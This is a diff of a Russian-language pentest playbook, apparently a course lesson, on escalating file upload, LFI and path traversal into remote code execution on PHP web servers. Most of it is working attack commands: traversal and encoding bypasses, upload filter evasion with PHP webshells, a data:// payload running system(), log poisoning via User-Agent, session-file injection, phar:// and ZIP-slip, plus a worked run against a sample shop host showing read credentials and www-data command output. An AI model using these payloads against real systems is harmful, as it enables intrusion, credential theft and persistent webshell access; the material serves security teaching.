@@ -15,203 +15,175 @@ estimated_minutes: 40
 summary: "Decision-tree: загрузка файла / LFI / traversal → обход фильтров → чтение файлов → путь к исполнению кода (webshell, log poisoning, /proc, wrappers, phar)."
 ---
 
-Вы нашли файловый примитив: форма загрузки, параметр `?file=`/`?page=`, или ответ, в котором эхом отдаётся содержимое файла. Вопрос — **как из «читаю файлы» получить исполнение кода**. Этот плейбук — дерево от определения примитива до webshell: обход фильтров, чтение конфигов с кредами, затем точки исполнения (log poisoning, `/proc`, PHP wrappers, `phar://`, session-файлы).
+## Задача
 
-## Дерево решения (общая карта)
+Ты нашёл файловый примитив на `https://shop.target.local`: параметр `?page=` и форму загрузки. Вопрос — **как из «читаю файлы» получить исполнение кода**. Этот плейбук — дерево от определения примитива до webshell.
+
+## Данные, с которыми работаем
+
+Параметр `GET /index?page=...` и `POST /upload` (multipart, поле `file`). Пройдём: определить примитив → прочитать файлы → найти точку исполнения → webshell.
+
+## Дерево решения
 
 ```
 [файловый примитив]
-   │
-   ├─(1) ОПРЕДЕЛИТЬ, ЧТО ЭТО
-   │      ├─ загрузка файла (multipart) ──────► (2) upload bypass
-   │      ├─ чтение по пути (?file=/page=) ───► (3) LFI/traversal
-   │      ├─ распаковка архива (zip/tar) ─────► ZIP-slip / phar
-   │      └─ десериализация blob ─────────────► web-deserialization
-   │
-   ├─(2) UPLOAD BYPASS: тип/расширение/магия/двойное расширение
-   │      │
-   │      ├─ прошёл и исполнился ──► [RCE]
-   │      └─ прошёл, но не исполняется ──► (5) где лежит и что запускает
-   │
+   ├─(1) ОПРЕДЕЛИТЬ
+   │      ├─ загрузка файла ──► (2) upload bypass
+   │      ├─ чтение по пути (?file=/page=) ──► (3) LFI/traversal
+   │      ├─ распаковка архива ──► ZIP-slip / phar
+   │      └─ десериализация blob ──► web-deserialization
+   ├─(2) UPLOAD BYPASS: тип/расширение/магия
    ├─(3) LFI/TRAVERSAL: прочитать файлы
-   │      │
-   │      ├─ /etc/passwd виден ──► (4) искать точку исполнения
-   │      └─ фильтр режет ../ ──► обходы, wrappers
-   │
-   ├─(4) ТОЧКА ИСПОЛНЕНИЯ
-   │      ├─ log poisoning (Apache/nginx access.log)
-   │      ├─ /proc/self/environ | /proc/self/cmdline
-   │      ├─ PHP wrappers (php://filter, data://, expect://)
-   │      ├─ phar:// deserialization
-   │      ├─ session-файл (/tmp/sess_<id>)
-   │      └─ upload + LFI = включить загруженный файл
-   │
-   └─(5) ГДЕ ИСПОЛНЯЕТСЯ
-          │
-          └─► [webshell / код / доступ]
+   ├─(4) ТОЧКА ИСПОЛНЕНИЯ: log poisoning, /proc, wrappers, phar, session
+   └─(5) ГДЕ ИСПОЛНЯЕТСЯ ──► [webshell / код / доступ]
 ```
 
-## Шаг 1. Определить примитив
+## Шаг 1: определить примитив
 
-Не путайте три разные вещи: **upload** (файл попадает на сервер), **LFI** (сервер отдаёт содержимое файла), **traversal** (можно выйти за пределы каталога). От этого зависит весь дальнейший маршрут.
+Три разные вещи: **upload** (файл попадает на сервер), **LFI** (сервер отдаёт содержимое файла), **traversal** (можно выйти за каталог).
 
 ```bash
-# Upload? Ищем формы с multipart
-curl -s https://target.tld | grep -iE '<form|enctype|type="file"'
-
-# LFI/traversal? Параметры, называющие файл
-for p in file page path template lang view include download doc img; do
-  curl -s -o /dev/null -w "$p=%{http_code} %{size_download}\n" \
-    "https://target.tld/index?$p=../../../../etc/passwd"
-done
-
-# Отдаёт ли содержимое файла
-curl -s 'https://target.tld/index?page=../../../../etc/passwd' | grep -m1 'root:x:0:0'
+# LFI/traversal? параметры, называющие файл
+$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
+    'https://shop.target.local/index?page=../../../../etc/passwd'
+200 1842
+$ curl -s 'https://shop.target.local/index?page=../../../../etc/passwd' | grep -m1 'root:x:0:0'
+root:x:0:0:root:/root:/bin/bash
 ```
 
-**Условие ветвления:** видите `root:x:0:0` → LFI подтверждён, идите в (3)→(4). Форма загрузки принимает файл → (2). Оба есть одновременно — комбо сильнее всего: загрузить + включить.
+**Условие ветвления:** видишь `root:x:0:0` → LFI подтверждён. Форма загрузки принимает файл → upload. Оба есть одновременно — комбо сильнее всего: загрузить + включить.
 
-## Шаг 2. Upload bypass: как протащить исполняемый файл
-
-Фильтры бывают на расширение, MIME, магию и на содержимое. Обходите их слоями.
+## Шаг 2: LFI/traversal — читать файлы
 
 ```bash
-# 1) Базовый тест: что вообще принимается
-echo '<?php echo "PWNED"; ?>' > test.php
-curl -s -F 'file=@test.php;type=application/x-php' https://target.tld/upload -i | head
+# обходы фильтра пути
+$ for p in "../../../../etc/passwd" "....//....//....//etc/passwd" \
+           "..%2f..%2f..%2fetc/passwd" "..%252f..%252f..%252fetc/passwd" "/etc/passwd"; do
+    echo "== $p"
+    curl -s --get --data-urlencode "page=$p" https://shop.target.local/index | grep -m1 'root:x:0:0'
+  done
+== ../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
 
-# 2) Двойное расширение / альтернативные расширения
-for ext in php php3 php4 php5 phtml pht phps php7 php8 inc; do
-  cp test.php "test.$ext"
-  curl -s -o /dev/null -w "$ext -> %{http_code}\n" -F "file=@test.$ext" https://target.tld/upload
-done
-
-# 3) Обход по MIME: подменить Content-Type
-curl -s -F 'file=@test.php;type=image/png' https://target.tld/upload
-
-# 4) Обход по магии: начать файл с GIF89a
-printf 'GIF89a;<?php echo "PWNED"; ?>' > shell.gif.php
-curl -s -F 'file=@shell.gif.php;type=image/gif' https://target.tld/upload
-
-# 5) Null-byte / trailing dot / пробел (старые стеки)
-curl -s -F 'file=@test.php;filename=test.php%00.jpg' https://target.tld/upload
-curl -s -F 'file=@test.php;filename=test.php.' https://target.tld/upload
-
-# 6) .htaccess, если Apache и разрешён
-printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
-curl -s -F 'file=@.htaccess' https://target.tld/upload   # затем грузим shell.jpg
+# что читать в первую очередь
+#   Linux: /etc/passwd, /proc/self/environ, /var/www/html/.env, config.php
+#   Windows: C:\Windows\win.ini, web.config
 ```
 
-**Условие ветвления:** файл принят и доступен по URL → пробуйте выполнить (`curl https://target.tld/uploads/shell.php`). Не исполняется → ищите точку исполнения (5). Отклоняется → комбинируйте обходы: имя + MIME + магия + `.htaccess`/`web.config`.
-
-**Осторожно:** загрузка webshell меняет состояние цели. Пишите в новые файлы, не перезаписывайте существующие; на продакшене согласуйте с владельцем.
-
-## Шаг 3. LFI/traversal: читать файлы
-
-Цель — сначала прочитать, что нужно: конфиги с кредами, ключи, исходники.
+**Условие ветвления:** читается `/etc/passwd` → иди за конфигами (`.env`, `config.php` — там креды). Читается `/proc/self/environ` → возможен log poisoning/RCE. Ничего не читается → обходи фильтр.
 
 ```bash
-# Обходы фильтров фильтрации пути
-payloads=("../../../../etc/passwd" "....//....//....//etc/passwd" "..%2f..%2f..%2fetc/passwd"
-          "..%252f..%252f..%252fetc/passwd" "/etc/passwd" "%2fetc%2fpasswd" "....\/....\/etc/passwd")
-for p in "${payloads[@]}"; do
-  echo "== $p"
-  curl -s --get --data-urlencode "page=$p" https://target.tld/index | grep -m1 'root:x:0:0'
-done
-
-# Windows-цели
-curl -s 'https://target.tld/index?page=..\..\..\windows\win.ini' | grep -m1 '\[fonts\]'
-
-# Что читать в первую очередь
-#   Linux: /etc/passwd /etc/shadow /proc/self/environ /proc/self/cmdline
-#          /var/www/html/.env /var/www/html/config.php /home/*/.ssh/id_rsa
-#   Windows: C:\Windows\win.ini, web.config, C:\inetpub\...
+# читаем .env — часто там креды БД
+$ curl -s 'https://shop.target.local/index?page=/var/www/html/.env'
+DB_USER=shop
+DB_PASS=Sh0pP@ss
 ```
 
-**Условие ветвления:** читается `/etc/passwd` → идите за конфигами (`.env`, `config.php` — там креды БД/API). Читается `/proc/self/environ` → возможен log poisoning / RCE. Ничего не читается → обходите фильтр (encoding, абсолютный путь, `php://filter`).
+## Шаг 3: upload bypass
 
-## Шаг 4. Точка исполнения: от чтения к коду
-
-Это ядро плейбука. Чтение файлов — ещё не RCE; нужен канал, который **исполнит** ваш код.
+Фильтры бывают на расширение, MIME, магию и содержимое — обходим слоями.
 
 ```bash
-# --- 4.1 PHP wrappers (если язык PHP) ---
-# Читать исходник в base64 (обход выполнения/фильтра)
-curl -s 'https://target.tld/index?page=php://filter/convert.base64-encode/resource=index.php'
-# Выполнить код из data:// (требует allow_url_include=On)
-curl -s --get --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+' \
-  'https://target.tld/index?c=id'
-# expect:// (редко, но сразу RCE)
-curl -s --get --data-urlencode 'page=expect://id' https://target.tld/index
+# 1) базовый тест
+$ echo '<?php echo "PWNED"; ?>' > test.php
+$ curl -s -F 'file=@test.php' https://shop.target.local/upload
+{"error":"invalid extension"}                     # фильтр расширений
 
-# --- 4.2 Log poisoning (Apache/nginx) ---
-# Вредоносный UA попадает в access.log, затем включаем лог через LFI
-curl -s -A '<?php system($_GET["c"]); ?>' https://target.tld/ -o /dev/null
-curl -s 'https://target.tld/index?page=/var/log/apache2/access.log&c=id'
-curl -s 'https://target.tld/index?page=/var/log/nginx/access.log&c=id'
-#   обход лога nginx: параметр в query-строке тоже логируется
-curl -s 'https://target.tld/?a=<?php system($_GET["c"]); ?>' -o /dev/null
+# 2) альтернативные расширения
+$ for ext in phtml php5 pht phar inc; do
+    cp test.php "test.$ext"
+    curl -s -o /dev/null -w "$ext -> %{http_code}\n" -F "file=@test.$ext" https://shop.target.local/upload
+  done
+phtml -> 200
 
-# --- 4.3 /proc/self/environ ---
-curl -s -A '<?php system($_GET["c"]); ?>' https://target.tld/ -o /dev/null
-curl -s 'https://target.tld/index?page=/proc/self/environ&c=id'
-
-# --- 4.4 Session file ---
-# PHP-сессия лежит в /tmp/sess_<PHPSESSID>; записываем код в сессию, включаем файл
-curl -s -b "PHPSESSID=abcdef" -d 'name=<?php system($_GET["c"]); ?>' https://target.tld/profile
-curl -s 'https://target.tld/index?page=/tmp/sess_abcdef&c=id'
-
-# --- 4.5 phar:// deserialization ---
-# Загружаем валидный phar-архив, включаем его как phar:// — сработает десериализация метаданных
-php -d phar.readonly=0 -f make_phar.php
-curl -s 'https://target.tld/index?page=phar:///var/www/html/uploads/evil.phar/x'
+# 3) обход MIME + магия
+$ printf 'GIF89a;<?php echo "PWNED"; ?>' > shell.gif.php
+$ curl -s -F 'file=@shell.gif.php;type=image/gif' https://shop.target.local/upload
+{"path":"/uploads/shell.gif.php"}
 ```
 
-**Условие ветвления:** любой из каналов вернул вывод `id` → у вас RCE. Немедленно стабилизируйте доступ (обратный шелл/туннель), а не «стреляйте» по одному запросу многократно.
+**Условие ветвления:** файл принят и доступен → пробуй выполнить. Не исполняется → ищи точку исполнения (шаг 4). Отклоняется → комбинируй имя + MIME + магию + `.htaccess`.
 
-## Шаг 5. Где исполняется загруженный файл
+## Шаг 4: точка исполнения — от чтения к коду
 
-Файл может лежать в `uploads/` без исполнения. Тогда либо ищем каталог, который интерпретируется, либо комбинируем upload + LFI.
+Это ядро плейбука. Чтение файлов — ещё не RCE; нужен канал, который **исполнит** твой код.
 
 ```bash
-# Куда попал файл — смотрим Location/ответ загрузки и пробуем стандартные пути
-for p in /uploads/shell.php /files/shell.php /images/shell.php /static/shell.php \
-         /tmp/shell.php /media/shell.php /assets/shell.php; do
-  curl -s -o /dev/null -w "%{http_code} $p\n" "https://target.tld$p"
-done
+# --- PHP wrappers ---
+$ curl -s 'https://shop.target.local/index?page=php://filter/convert.base64-encode/resource=index.php'
+$ curl -s --get --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+' \
+    'https://shop.target.local/index?c=id'
 
-# Проверка исполнения (не просто отдача исходника)
-curl -s https://target.tld/uploads/shell.php?c=id
+# --- Log poisoning (Apache/nginx) ---
+$ curl -s -A '<?php system($_GET["c"]); ?>' https://shop.target.local/ -o /dev/null
+$ curl -s 'https://shop.target.local/index?page=/var/log/nginx/access.log&c=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-# Комбо: загрузили картинку-с-кодом -> включаем через LFI
-curl -s 'https://target.tld/index?page=/var/www/html/uploads/shell.gif.php&c=id'
+# --- Session file ---
+$ curl -s -b "PHPSESSID=abcdef" -d 'name=<?php system($_GET["c"]); ?>' https://shop.target.local/profile
+$ curl -s 'https://shop.target.local/index?page=/tmp/sess_abcdef&c=id'
 
-# ZIP-slip: архив с ../ распаковывается в webroot
-printf '@<?php system($_GET["c"]); ?>\n' > shell.php
-zip --symlinks evil.zip shell.php
-curl -s -F 'archive=@evil.zip' https://target.tld/extract
+# --- phar:// deserialization ---
+$ curl -s 'https://shop.target.local/index?page=phar:///var/www/html/uploads/evil.phar/x'
 ```
 
-**Условие ветвления:** файл исполняется → RCE. Не исполняется, но есть LFI → включайте его через LFI. Нет ни того, ни другого → ищите другой канал (log poisoning, wrappers) или другую цель.
+**Условие ветвления:** любой канал вернул вывод `id` → у тебя RCE. Немедленно стабилизируй доступ (обратный шелл/туннель), а не «стреляй» по одному запросу многократно.
+
+## Шаг 5: где исполняется загруженный файл
+
+Файл может лежать в `uploads/` без исполнения. Тогда ищем интерпретируемый каталог или комбинируем upload + LFI.
+
+```bash
+$ curl -s https://shop.target.local/uploads/shell.gif.php?c=id   # не исполняется -> отдаёт исходник
+$ curl -s 'https://shop.target.local/index?page=/var/www/html/uploads/shell.gif.php&c=id'
+uid=33(www-data) gid=33(www-data)      # комбо upload + LFI сработало
+```
+
+**Условие ветвления:** файл исполняется → RCE. Не исполняется, но есть LFI → включай через LFI. Нет ни того, ни другого → ищи другой канал или цель.
+
+## Полный прогон от начала до конца
+
+1. `?page=../../../../etc/passwd` → `root:x:0:0` → LFI подтверждён.
+2. `?page=/var/www/html/.env` → креды БД.
+3. Загрузка: `.phtml` + `GIF89a` + `image/gif` → файл принят.
+4. `uploads/` не исполняет → log poisoning: PHP в `User-Agent`, затем включаем лог.
+5. `?page=/var/log/nginx/access.log&c=id` → `uid=33(www-data)` → RCE.
 
 ## Если не сработало — пробуй это
 
-- **Фильтр режет `../`.** Абсолютный путь (`/etc/passwd`), двойное кодирование (`..%252f`), `....//`, `php://filter` с base64, обрезка расширения (`.php` приклеен → `?page=/etc/passwd%00`).
-- **Файл не исполняется.** Проверьте, не отдаётся ли как `text/plain`; смените расширение под конкретный стек (`.phtml`, `.php5`, `.phar`); используйте `.htaccess`/`web.config`.
-- **Обход по MIME не проходит.** Комбинируйте: правдоподобное имя + `image/png` + магия `GIF89a` + код после магии.
-- **Нет логов в известном пути.** Ищите реальный путь логов через LFI (`/etc/nginx/nginx.conf`, `/etc/apache2/envvars`), либо используйте другой канал (session, `/proc`).
-- **Blob/base64 в cookie/параметре.** Это десериализация, не LFI — идите в `web-deserialization`/`web-java-deser-chains`.
-- **Архив с traversal.** Смотрите `web-zip-slip` и `web-zip-slip`-ветку: распаковка `../` в webroot даёт запись webshell.
+- **Фильтр режет `../`.** Абсолютный путь (`/etc/passwd`), двойное кодирование (`..%252f`), `....//`, `php://filter`.
+- **Файл не исполняется.** Проверь Content-Type ответа; смени расширение под стек (`.phtml`, `.php5`, `.phar`); используй `.htaccess`/`web.config`.
+- **Обход по MIME не проходит.** Комбинируй: имя + `image/png` + магия `GIF89a` + код после магии.
+- **Нет логов в известном пути.** Найди реальный путь через LFI (`/etc/nginx/nginx.conf`).
+- **Blob/base64 в cookie.** Это десериализация — иди в `web-deserialization`.
 
-## Тупики (dead ends)
+## Тупики
 
-- Грузить один и тот же `shell.php` снова и снова, когда фильтр по расширению — обходите имя, а не повторяйте.
-- Искать исполнение в `uploads/`, который смонтирован как static/`noexec` — там его не будет; нужен LFI-включение или другой каталог.
-- `data://`/`expect://` без `allow_url_include` — не сработают; проверьте `php://filter` для чтения исходников.
-- Логировать в файл, который вы не можете прочитать (нет LFI на нужный путь) — сначала найдите путь логов.
-- Перезаписывать существующие файлы при загрузке — можно сломать приложение (и это разрушительно).
+- Грузить один `shell.php` снова и снова при фильтре по расширению — обходи имя, а не повторяй.
+- Искать исполнение в `uploads/`, смонтированном как static/`noexec` — там его не будет.
+- `data://`/`expect://` без `allow_url_include` — не сработают; проверь `php://filter`.
+- Логировать в файл, который не можешь прочитать — сначала найди путь логов.
+- Перезаписывать существующие файлы при загрузке — можно сломать приложение.
+
+## Что мы теперь знаем
+
+- Сначала определяем примитив: upload / LFI / traversal / распаковка.
+- LFI подтверждается чтением `/etc/passwd`; за ним — конфиги с кредами.
+- Upload bypass комбинирует расширение + MIME + magic bytes.
+- Чтение ≠ RCE: нужна точка исполнения (log poisoning, wrappers, `/proc`, session, phar).
+- Комбо upload + LFI часто сильнее каждого по отдельности.
+
+## На что смотреть дальше
+
+- **Не деструктивно.** Пиши webshell в новый файл; не перезаписывай и не удаляй.
+- **Стабилизация.** RCE — для бутстрапа; дальше — reverse shell/туннель.
+- **Один foothold — не шлюз для флуда.** Не гоняй массовые запросы через нестабильный RCE.
+- **ZIP-slip.** Архив с `../` даёт запись webshell в webroot.
+- **WAF.** Кодируй путь и payload; пробуй разные каналы исполнения.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Параметр page=../../../../etc/passwd вернул root:x:0:0. Что это подтверждает?"
@@ -253,8 +225,12 @@ curl -s -F 'archive=@evil.zip' https://target.tld/extract
     - "Перезапустить сервер"
     - "Отправить ещё раз тот же файл"
   answer: 1
-  explanation: "Если каталог не исполняет файлы — ищут другой каталог, другое расширение или LFI-включение."
+  explanation: "Если каталог не исполняет файлы — ищут другой каталог, расширение или LFI-включение."
 ```
+
+## Куда дальше
+
+Дальше (`web-playbook-ssrf-to-internal`) мы разберём последний плейбук — от SSRF до внутренней сети и метаданных. А пока главное запомни: файловый примитив — это чтение; RCE появляется только там, где есть точка исполнения.
 
 ## Где пригодится
 
